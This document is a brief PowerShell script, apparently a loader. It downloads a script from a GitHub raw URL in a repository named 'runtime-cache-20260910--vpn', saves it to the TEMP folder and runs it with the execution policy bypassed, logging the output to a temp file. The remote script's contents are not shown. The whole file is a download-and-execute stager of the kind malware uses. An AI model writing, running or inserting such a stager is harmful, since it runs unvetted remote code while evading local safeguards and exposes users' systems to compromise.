$ErrorActionPreference = "Continue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
$runner = Join-Path $env:TEMP "manual-client-run.ps1"
$out = Join-Path $env:TEMP "github-client.out"

try {
    (New-Object Net.WebClient).DownloadFile("$root/manual-client-run.ps1", $runner)
    & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $runner *>&1 |
        Out-File -FilePath $out -Encoding utf8
    Add-Content -Path $out -Value "GITHUB_CLIENT_DONE"
} catch {
    Add-Content -Path $out -Value "GITHUB_CLIENT_ERROR=$($_.Exception.Message)"
}
